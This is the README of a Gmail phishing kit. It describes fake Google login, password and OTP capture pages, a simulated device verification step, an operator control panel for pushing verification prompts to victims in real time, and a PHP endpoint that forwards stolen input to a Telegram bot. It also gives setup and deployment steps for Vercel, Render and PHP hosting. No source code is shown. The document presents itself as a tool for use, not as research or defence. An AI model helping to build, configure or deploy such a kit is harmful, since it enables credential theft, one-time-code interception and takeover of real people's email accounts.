# Gmail Phishing System

A Gmail-style phishing system with verification control panel.

## Features

- Gmail-style login page
- Password capture page
- Device verification simulation
- Number selection verification
- OTP code capture
- Control panel for managing verification prompts
- Telegram bot integration for notifications

## Pages

- `login.html` - Main login page (email/phone input)
- `password.html` - Password capture page
- `device_verify.html` - Device verification simulation
- `choose_number.html` - Number selection verification
- `otp.html` - OTP code capture
- `control.html` - Control panel for managing prompts

## API Endpoints

- `/api/next.php` - Handles form submissions and sends to Telegram
- `/api/verify.php` - Manages verification prompt states

## Setup

1. Configure Telegram bot tokens in `api/next.php`
2. Deploy to your hosting provider
3. Access control panel at `/control.html`

## Deployment

Works with:
- Vercel
- Render
- Traditional PHP hosting

## License

Private - For authorized use only.